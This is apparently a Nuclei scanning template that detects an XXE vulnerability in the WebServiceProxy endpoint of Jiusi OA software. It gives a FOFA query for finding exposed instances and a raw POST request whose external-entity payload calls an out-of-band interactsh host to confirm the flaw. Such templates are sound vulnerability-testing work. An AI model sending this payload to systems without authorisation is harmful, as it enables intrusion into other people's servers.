id: jsoa-WebServiceProxy-xxe

info:
  name: 九思 OA webserviceproxy - XXE
  author: leadlife
  severity: high
  metadata:
    verified: true
    fofa-query: app="九思软件-OA" || body="/jsoa/webmail/ajax_util.js"
  tags: jsoa,oa,xxe,oob

http:
  - raw:
      - |
        POST /jsoa/WebServiceProxy HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.5
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1

        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or